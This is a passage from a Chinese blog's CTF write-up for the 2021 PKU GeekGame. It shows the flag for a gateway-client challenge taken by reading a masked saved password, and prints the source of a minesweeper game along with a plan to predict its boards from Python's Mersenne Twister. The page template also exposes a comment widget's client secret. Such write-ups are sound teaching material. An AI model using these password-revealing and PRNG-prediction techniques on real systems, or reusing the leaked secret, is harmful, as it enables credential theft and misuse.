<h2 id="诡异的网关"><a href="#诡异的网关" class="headerlink" title="诡异的网关"></a>诡异的网关</h2><blockquote>
<p>2021年，小咕终于把操作系统从 XP 升级到了 Win 7！<br>正如身边同学的装机必备软件是 2345 浏览器、360 安全卫士，小咕刚装好系统就要安装北大网关客户端。 </p>
<p>小咕熟练的打开 its，下载，安装，完成！ </p>
<p>但这次的程序，好像……有点不一样？<br>会不会是被黑客篡改过了？ </p>
<p><strong>点击 “打开/下载题目” 下载题目附件</strong> </p>
<p><em>此程序专为本题而设计，请勿用于其他用途</em> </p>
<p><em>提示：探索程序的 UI 可能带来意外收获。</em></p>
</blockquote>
<p>下载下来，拖进 IDA，这啥啊，算了不逆了。</p>
<p>执行程序，发现 UserID 下面有个 flag，Password 也保存了，就这个了吧。</p>
<p>打开 x64dbg，开始动态调试，调了调，算了，摸了。</p>
<p>直接拿出 星号密码查看器 拖动就完事了。（喵喵懒懒.jpg</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211117025323283.png"></p>
<p><code>flag{h0w_diD_you_g3T_th3_passw0rd?}</code></p>
<h2 id="扫雷"><a href="#扫雷" class="headerlink" title="扫雷"></a>扫雷</h2><blockquote>
<p>小咕曾是部队里负责扫雷的工兵，退役之后，迷上了电脑上自带的扫雷游戏。 以他的话说，“这是速度与精度的完美结合”。 </p>
<p>2021年，小咕终于把操作系统从 XP 升级到了 Win 7！<br>正如身边的人抱怨 Win 11 的华而不实，小咕也感觉升级后的扫雷游戏失去了某种朴素的味道。 但他却无处泄愤。 </p>
<p>于是，小咕决定自学编程，实现自己心中完美的扫雷游戏。<br>鉴于玩家水平各异，小咕还实现了 Easy 模式，以纪念首次上阵就踩雷的同志们。 </p>
<p><strong>你可以 <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/media/prob09_3fqg6drlsjniou2w.zip?token=xxx">下载本题的程序</a></strong></p>
<p>点击 “打开/下载题目” 将打开网页终端，你也可以通过命令 <code>nc prob09.geekgame.pku.edu.cn 10009</code> 手动连接到题目</p>
<p><em>提示：困难模式对应 Flag 1，简单模式对应 Flag 2。</em></p>
<p><strong>第二阶段提示</strong> </p>
<p>了解一下 Python 随机数的实现。</p>
</blockquote>
<p>给了源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> random
<span class="token keyword">import</span> signal

<span class="token keyword">import</span> functools
<span class="token keyword">print</span> <span class="token operator">=</span> functools<span class="token punctuation">.</span>partial<span class="token punctuation">(</span><span class="token keyword">print</span><span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token keyword">from</span> mylib <span class="token keyword">import</span> show_flag


WIDTH <span class="token operator">=</span> <span class="token number">16</span>
HEIGHT <span class="token operator">=</span> <span class="token number">16</span>
ROUND_LIMIT <span class="token operator">=</span> <span class="token number">2000</span>


<span class="token keyword">def</span> <span class="token function">gen_board</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    bits <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span>WIDTH <span class="token operator">*</span> HEIGHT<span class="token punctuation">)</span>
    board <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> WIDTH <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>HEIGHT<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>HEIGHT<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>WIDTH<span class="token punctuation">)</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token punctuation">(</span>bits <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> WIDTH <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span>
            board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> x
    <span class="token keyword">return</span> board


<span class="token keyword">def</span> <span class="token function">check_win</span><span class="token punctuation">(</span>board<span class="token punctuation">,</span> marks<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>HEIGHT<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>WIDTH<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token keyword">not</span> marks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">near_count</span><span class="token punctuation">(</span>board<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
    delta <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    count <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> d <span class="token keyword">in</span> delta<span class="token punctuation">:</span>
        tx<span class="token punctuation">,</span> ty <span class="token operator">=</span> x <span class="token operator">+</span> d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> y <span class="token operator">+</span> d<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> tx <span class="token operator">&lt;</span> HEIGHT <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> ty <span class="token operator">&lt;</span> WIDTH<span class="token punctuation">:</span>
            count <span class="token operator">+=</span> board<span class="token punctuation">[</span>tx<span class="token punctuation">]</span><span class="token punctuation">[</span>ty<span class="token punctuation">]</span>
    <span class="token keyword">return</span> count


<span class="token keyword">def</span> <span class="token function">show_board</span><span class="token punctuation">(</span>board<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>HEIGHT<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>WIDTH<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>near_count<span class="token punctuation">(</span>board<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>easy_mode<span class="token punctuation">)</span><span class="token punctuation">:</span>
    signal<span class="token punctuation">.</span>alarm<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">)</span>
    count <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        board <span class="token operator">=</span> gen_board<span class="token punctuation">(</span><span class="token punctuation">)</span>
        count <span class="token operator">+=</span> <span class="token number">1</span>
        marks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span> <span class="token operator">*</span> WIDTH <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>HEIGHT<span class="token punctuation">)</span><span class="token punctuation">]</span>
        steps <span class="token operator">=</span> <span class="token number">0</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"New Game!"</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token keyword">not</span> check_win<span class="token punctuation">(</span>board<span class="token punctuation">,</span> marks<span class="token punctuation">)</span><span class="token punctuation">:</span>
            x<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"&gt; "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>
            x<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>
            <span class="token keyword">if</span> board<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> easy_mode <span class="token keyword">and</span> steps <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                    <span class="token keyword">while</span> board<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                        board <span class="token operator">=</span> gen_board<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"BOOM!"</span><span class="token punctuation">)</span>
                    show_board<span class="token punctuation">(</span>board<span class="token punctuation">)</span>
                    <span class="token keyword">break</span>
            marks<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>near_count<span class="token punctuation">(</span>board<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>
            steps <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment"># win</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You win the game in %d steps!"</span> <span class="token operator">%</span> steps<span class="token punctuation">)</span>
            show_flag<span class="token punctuation">(</span>easy_mode<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    
        <span class="token keyword">if</span> count <span class="token operator">&gt;=</span> ROUND_LIMIT<span class="token punctuation">:</span>
            <span class="token keyword">break</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        t <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"try again? (y/n)"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> t <span class="token operator">!=</span> <span class="token string">'y'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye"</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the minesweeper game!"</span><span class="token punctuation">)</span>

    t <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"easy mode? (y/n)"</span><span class="token punctuation">)</span>
    easy_mode <span class="token operator">=</span> t <span class="token operator">==</span> <span class="token string">'y'</span>
    run<span class="token punctuation">(</span>easy_mode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概思路就是，先尽可能失败一堆，拿到整个棋盘，然后据此算出原始的随机数。通过 python 随机数机制推断出下一次的棋盘，再去解扫雷就完事了</p>
<p>（由于这题是最后一天凌晨看的，当天白天还有其他比赛，这个还要写交互，于是摸了.jpg</p>
<p>看看 Python 的随机数机制。</p>
<blockquote>
<p>几乎所有模块函数都依赖于基本函数 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/random.html#random.random"><code>random()</code></a> ，它在半开放区间 [0.0,1.0) 内均匀生成随机浮点数。 Python 使用 Mersenne Twister 作为核心生成器。 它产生  53 位精度浮点数，周期为 2**19937-1 ，其在 C 中的底层实现既快又线程安全。 Mersenne Twister  是现存最广泛测试的随机数发生器之一。 但是，因为完全确定性，它不适用于所有目的，并且完全不适合加密目的。</p>
<ul>
<li><p><code>random.getrandbits(k)</code></p>
<p>返回具有 <em>k</em> 个随机比特位的非负 Python 整数。 此方法随 MersenneTwister 生成器一起提供，其他一些生成器也可能将其作为 API 的可选部分提供。 在可能的情况下，<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/random.html#random.getrandbits"><code>getrandbits()</code></a> 会启用 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/random.html#random.randrange"><code>randrange()</code></a> 来处理任意大的区间。 </p>
<p>在 3.9 版更改: 此方法现在接受零作为 <em>k</em> 的值。</p>
</li>
</ul>
<p><em>via <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/random.html">https://docs.python.org/zh-cn/3/library/random.html</a></em></p>
</blockquote>
<p>（后面再来复现吧，理论上拿个现成的库预测一下就行吧</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>好难啊，太顶了吧！</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211206025648978.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211206025700086.png" alt="rk39"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211206025723165.png" alt="解题情况"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211206025750507.png" alt="一血"></p>
<p>最后拿了 39 名，拿了个一血，摸了。</p>
<p>感觉题目挺绕的挺套的，一道题做一天，不对，是从第一天看到最后一天也没做出来……</p>
<p>比如说 Flag即服务 那题本来第二问拿了个二血（没抢到一血哭哭），于是想抢第三问一血的，结果到了最后一天发现其他问题都解决了，就卡在带有过滤的有限长度的代码执行上了，害，其实就是 jsfuck 没好好优化啦（（（别骂了</p>
<blockquote>
<p> 本届竞赛将继续追求 <strong>题目新颖有趣、难度具有梯度，让没有相关经验的新生和具有一定专业基础的学生都能享受比赛，在学习的过程中有所收获。</strong></p>
</blockquote>
<p>题目里面还埋了挺多梗，但感觉难度梯度有点大，容易劝退，而且这打起来太花时间太折腾喵喵啦，每次看着以为马上出结果总有下一层等着你。</p>
<p>不过话说回来，题目套的点比较多，从学习的角度而言看 writeup 来学习的话收获还是不少的，Orz！</p>
<p>（u1s1，打这个比赛太累了</p>
<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul>
<li>比赛平台： <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/">https://geekgame.pku.edu.cn/</a></li>
<li><strong>官方资料存档及题解 repo</strong>： <a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-1st">1st PKU GeekGame</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.taoky.moe/2021-11-21/geekgame-v1-wp.html">taoky’s GeekGame v1 (2021) writeups</a></li>
<li>etc.</li>
</ul>
<p>（溜了溜了喵~</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2021/11/25/CTF_2021PKUGeekGame/">https://miaotony.xyz/2021/11/25/CTF_2021PKUGeekGame/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特别声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/" class="reward-img" alt="支付宝打赏二维码">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2021-11-25T21-20-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/11/30/CTF_2021NCTF/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/2.jpg" class="responsive-img" alt="CTF | 2021 NCTF/NJUPTCTF WriteUp">
                        
                        <span class="card-title">CTF | 2021 NCTF/NJUPTCTF WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            又是一年南邮校赛NCTF，今年的题目太难了啊，做不来做不来，本来还想恰烂钱的，最后摆烂了。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/11/03/CTF_2021Hackergame/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/9.jpg" class="responsive-img" alt="CTF | 2021 USTC Hackergame WriteUp">
                        
                        <span class="card-title">CTF | 2021 USTC Hackergame WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            今年的Hackergame又来了，题目很有梯度，也学到了许多，明年有机会的话还来。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-03
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: MiaoTony&#39;s小窝<br />'
            + '文章作者: MiaoTony<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
